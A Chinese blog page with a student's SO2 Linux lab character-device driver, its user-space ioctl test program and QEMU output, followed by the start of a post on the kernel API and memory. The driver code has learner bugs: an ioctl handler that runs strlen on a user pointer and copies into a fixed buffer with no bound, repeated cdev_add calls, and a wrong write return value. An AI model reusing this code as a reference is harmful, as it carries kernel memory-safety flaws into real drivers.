如果一个进程尝试open一个&quot;data-&gt;access&quot;为&#x27;1&#x27;的&#x27;/dev/so2_cdev&#x27;字符设备,就不会立刻返回,而是执行后面的语句并睡眠</span></span><br><span class="line"><span class="comment">    (so2_device_data也属于临界区,如果两个进程open同一个字符设备就可能有安全问题)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">if</span>(!atomic_cmpxchg(&amp;data-&gt;access,<span class="number">0</span>,<span class="number">1</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">10</span> * HZ);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_release</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 2: print message when the device file is closed. */</span></span><br><span class="line">	printk(<span class="string">&quot;message:%s&quot;</span>,MESSAGE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EXTRA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="comment">/* TODO 3: reset access variable to 0, use atomic_set */</span></span><br><span class="line">	atomic_set(&amp;data-&gt;access,<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_read</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">size_t</span> to_read;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXTRA</span></span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: Copy data-&gt;buffer to user_buffer, use copy_to_user */</span></span><br><span class="line">	to_read = min(BUFSIZ-*offset,size);</span><br><span class="line">	<span class="keyword">if</span>(copy_to_user(user_buffer,data-&gt;buffer+*offset,to_read))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	*offset += to_read;</span><br><span class="line">	<span class="keyword">return</span> to_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 5: copy user_buffer to data-&gt;buffer, use copy_from_user */</span></span><br><span class="line">	<span class="keyword">size_t</span> to_write = min(BUFSIZ-*offset,size);</span><br><span class="line">	<span class="keyword">if</span>(copy_from_user(data-&gt;buffer+*offset,user_buffer,to_write))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	*offset += to_write;</span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> remains;</span><br><span class="line">	printk(<span class="string">&quot;ioctl start&quot;</span>);</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="comment">/* TODO 6: if cmd = MY_IOCTL_PRINT, display IOCTL_MESSAGE */</span></span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_PRINT:</span><br><span class="line">		printk(<span class="string">&quot;%s&quot;</span>,IOCTL_MESSAGE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks, for home */</span></span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_SET_BUFFER:</span><br><span class="line">		<span class="keyword">if</span>(copy_from_user(data-&gt;buffer,(<span class="keyword">char</span> *)arg,<span class="built_in">strlen</span>(arg)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		printk(<span class="string">&quot;buffer from usr:%s&quot;</span>,data-&gt;buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_GET_BUFFER:</span><br><span class="line">		<span class="keyword">if</span>(copy_to_user((<span class="keyword">char</span> *)arg,data-&gt;buffer,<span class="built_in">strlen</span>(data-&gt;buffer)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_DOWN:</span><br><span class="line">		wait_event(data-&gt;<span class="built_in">queue</span>,<span class="number">0</span>); <span class="comment">/* 这里有小迷,当前进程直接进入等待队列,程序卡死 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_UP:</span><br><span class="line">		wake_up(&amp;data-&gt;<span class="built_in">queue</span>); <span class="comment">/* 这里就更迷了,根本不能确定唤醒了那个进程 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">so2_fops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line"><span class="comment">/* TODO 2: add open and release functions */</span></span><br><span class="line">	.open = so2_cdev_open,</span><br><span class="line">	.release = so2_cdev_release,</span><br><span class="line"><span class="comment">/* TODO 4: add read function */</span></span><br><span class="line">	.read = so2_cdev_read,</span><br><span class="line"><span class="comment">/* TODO 5: add write function */</span></span><br><span class="line">	.write = so2_cdev_write,</span><br><span class="line"><span class="comment">/* TODO 6: add ioctl function */</span></span><br><span class="line">	.unlocked_ioctl = so2_cdev_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">so2_cdev_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: register char device region for MY_MAJOR and NUM_MINORS starting at MY_MINOR */</span></span><br><span class="line">	err = register_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>),NUM_MINORS,MODULE_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_MINORS; i++) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXTRA</span></span><br><span class="line">		<span class="comment">/* TODO 7: extra tasks, for home */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		<span class="comment">/* TODO 4: initialize buffer with MESSAGE string */</span></span><br><span class="line">		<span class="built_in">strcpy</span>(devs[i].buffer,MESSAGE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line">		init_waitqueue_head(&amp;devs[i].<span class="built_in">queue</span>);</span><br><span class="line">		<span class="comment">/* TODO 3: set access variable to 0, use atomic_set */</span></span><br><span class="line">		atomic_set(&amp;devs[i].access,<span class="number">0</span>);</span><br><span class="line">		<span class="comment">/* TODO 2: init and add cdev to kernel core */</span></span><br><span class="line">		cdev_init(&amp;devs[i].cdev,&amp;so2_fops);</span><br><span class="line">		cdev_add(&amp;devs[i].cdev,MKDEV(MY_MAJOR,<span class="number">0</span>),NUM_MINORS);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">so2_cdev_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_MINORS; i++) &#123;</span><br><span class="line">		<span class="comment">/* TODO 2: delete cdev from kernel core */</span></span><br><span class="line">		cdev_del(&amp;devs[i].cdev);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: unregister char device region, for MY_MAJOR and NUM_MINORS starting at MY_MINOR */</span></span><br><span class="line">	unregister_chrdev_region(MKDEV(MY_MAJOR,<span class="number">0</span>),NUM_MINORS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(so2_cdev_init);</span><br><span class="line">module_exit(so2_cdev_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>在用户态执行的测试代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 Lab - Linux device drivers (#4)</span></span><br><span class="line"><span class="comment"> * User-space test file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../include/so2_cdev.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH	<span class="meta-string">&quot;/dev/so2_cdev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prints error message and exits</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(message);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * print use case</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *argv0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;options&gt;\n options:\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tp - print\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\ts string - set buffer\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tg - get buffer\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\td - down\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tu - up\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tn - open with O_NONBLOCK and read data\n&quot;</span>, argv0);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Sample run:</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test p		; print ioctl message</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test d		; wait on wait_queue</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test u		; wait on wait_queue</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">		usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">1</span>)</span><br><span class="line">		usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	fd = open(DEVICE_PATH, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (argv[<span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:				<span class="comment">/* print */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_PRINT, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:				<span class="comment">/* set buffer */</span></span><br><span class="line">		<span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">			usage(argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">		<span class="built_in">strncpy</span>(buffer, argv[<span class="number">2</span>], BUFFER_SIZE);</span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_SET_BUFFER, buffer) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:				<span class="comment">/* get buffer */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_GET_BUFFER, buffer) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;IOCTL buffer contains %s\n&quot;</span>, buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:				<span class="comment">/* down */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_DOWN, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:				<span class="comment">/* up */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_UP, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span> (fcntl(fd, F_SETFL, O_RDONLY | O_NONBLOCK) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (read(fd, buffer, BUFFER_SIZE) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Device buffer contains %s\n&quot;</span>, buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		error(<span class="string">&quot;Wrong parameter&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers/kernel<span class="meta"># insmod so2_cdev.ko</span></span><br><span class="line">root@qemux86:~/skels/device_drivers<span class="meta"># mknod /dev/so2_cdev c 42 0   </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test p                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">Hello ioctl                                                                     </span><br><span class="line">message:hello     </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test g                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">IOCTL buffer contains hello                                                     </span><br><span class="line">                                                                                </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test s yhellow             </span><br><span class="line">message:hello                                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">buffer from usr:yhellow                                                         </span><br><span class="line">message:hello                                                                   </span><br><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test g                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">IOCTL buffer contains yhellow                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">message:hello   </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers<span class="meta"># cat /dev/so2_cdev                          </span></span><br><span class="line">message:hello                                                                   </span><br><span class="line">hello                                                                           </span><br><span class="line">message:hello</span><br></pre></td></tr></table></figure>
<p>感觉在锁和等待队列这一块还不是很熟悉，还需要多写代码</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/12/Linux-Lab2-Kernel%20API/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/12/Linux-Lab2-Kernel%20API/" class="post-title-link" itemprop="url">Linux-Lab2-Kernel API</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-12 02:02:24 / Modified: 02:04:44" itemprop="dateCreated datePublished" datetime="2022-10-12T02:02:24+08:00">2022-10-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel API</strong></p>
<ul>
<li>熟悉基本的 Linux kernel API</li>
<li>内存分配机制说明</li>
<li>locking 机制说明</li>
</ul>
<p>内核是一个独立的实体，不能使用用户空间中的库（甚至不能使用 libc）</p>
<p>总之，内核编程基于一个全新的独立API，无论我们指的是 POSIX 还是 ANSI-C，它都与用户空间 API 无关</p>
<p><strong>Accessing memory</strong></p>
<p>内核编程中的一个重要区别是如何访问和分配内存，由于内核编程非常接近物理机，因此内存管理有重要的规则</p>
<p>首先，它适用于几种类型的内存：</p>
<ul>
<li>物理内存</li>
<li>内核地址空间中的虚拟内存</li>
<li>进程地址空间的虚拟内存</li>
<li>驻留内存（那些被映射到进程虚拟内存空间的物理内存）</li>
</ul>
<p>对于驻留内存而言，进程虚拟地址和内核虚拟地址有不同的情况：</p>
<ul>
<li>进程的地址空间中的虚拟内存不能被视为驻留：<ul>
<li>page 可能被交换，或者由于需求分页机制而根本不存在于物理内存中</li>
</ul>
</li>
<li>内核地址空间中的内存可以驻留或不驻留：<ul>
<li>模块的数据段和代码段以及进程的内核堆栈都是驻留的</li>
<li>动态内存可能是驻留的，也可能不是驻留的，具体取决于它的分配方式</li>
</ul>
</li>
<li>使用驻留内存时，事情很简单，因为可以随时访问驻留内存</li>
<li>如果使用非驻留内存，则只能从某些上下文中访问它</li>
<li>因此，当操作系统检测到此类访问时，它将采取严厉措施（阻止或重置系统以防止严重损坏）</li>
</ul>
<p>进程的虚拟内存通常不能直接从内核访问，但在某些情况下，设备驱动程序需要执行此操作：</p>
<ul>
<li>典型情况是设备驱动程序需要从用户空间访问缓冲区</li>
<li>在这种情况下，设备驱动程序必须使用特殊功能，并且不能直接访问缓冲区</li>
<li>这是防止访问无效内存区域所必需的</li>
</ul>
<p>相对于用户空间调度，内核的另一个区别是栈：</p>
<ul>
<li>栈的大小是固定且有限的（在 Linux 中使用 4K 堆栈，在视窗中使用 12K 堆栈）</li>
<li>因此，应避免在堆栈上分配大型结构或使用递归调用</li>
</ul>
<p><strong>Contexts of execution</strong></p>
<p>关于内核执行，我们区分两个上下文：</p>
<ul>
<li>进程上下文：<ul>
<li>运行代码作为系统调用的结果时</li>
<li>在内核线程的上下文中运行时</li>
</ul>
</li>
<li>中断上下文：<ul>
<li>在例程中运行以处理中断时</li>
<li>可延迟操作时</li>
</ul>
</li>
</ul>
